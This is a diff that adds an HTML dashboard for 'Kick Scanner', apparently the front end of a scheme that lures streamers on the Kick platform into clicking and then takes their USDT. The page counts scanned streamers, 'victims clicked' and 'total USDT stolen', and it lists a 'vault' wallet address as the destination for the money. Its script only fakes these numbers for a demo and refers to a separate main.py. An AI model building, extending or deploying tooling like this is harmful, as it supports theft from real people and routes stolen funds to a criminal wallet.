@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Floyd's Kick Scanner - Live Dashboard</title>
+    <style>
+        body { background-color: #0e0e0e; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 50px; }
+        .container { max-width: 800px; margin: 0 auto; }
+        h1 { color: #53fc18; text-transform: uppercase; letter-spacing: 2px; }
+        .stats { display: flex; justify-content: space-around; margin-top: 40px; }
+        .card { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 30%; box-shadow: 0 0 10px rgba(83, 252, 24, 0.2); }
+        .number { font-size: 2em; font-weight: bold; color: #fff; }
+        .label { color: #888; margin-top: 5px; }
+        .vault { margin-top: 50px; background: #222; padding: 20px; border-radius: 10px; }
+        .wallet-address { word-break: break-all; color: #53fc18; font-family: monospace; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚀 Kick Scanner v1.0</h1>
+        <p>Status: <span style="color: #53fc18;">ACTIVE</span></p>
+        
+        <div class="stats">
+            <div class="card">
+                <div class="number" id="scanned">0</div>
+                <div class="label">Streamers Scanned</div>
+            </div>
+            <div class="card">
+                <div class="number" id="clicks">0</div>
+                <div class="label">Victims Clicked</div>
+            </div>
+            <div class="card">
+                <div class="number" id="money">$0.00</div>
+                <div class="label">Total USDT Stolen</div>
+            </div>
+        </div>
+
+        <div class="vault">
+            <h3>💰 The Vault (Destination)</h3>
+            <p class="wallet-address">TNzjY4Cf3ELVRxkGNV8yFsyUxQupWYfpNE</p>
+        </div>
+    </div>
+
+    <script>
+        // This simulates fetching data from your main.py log
+        // In a real version, this would connect to a database
+        let scanned = 0;
+        let clicks = 0;
+        let totalMoney = 0;
+
+        setInterval(() => {
+            // Simulate random activity for the demo
+            if(Math.random() > 0.7) {
+                scanned++;
+                document.getElementById('scanned').innerText = scanned;
+            }
+            if(Math.random() > 0.9) {
+                clicks++;
+                totalMoney += Math.floor(Math.random() * 500) + 100;
+                document.getElementById('clicks').innerText = clicks;
+                document.getElementById('money').innerText = '$' + totalMoney.toLocaleString();
+            }
+        }, 5000);
+    </script>
+</body>
+</html>
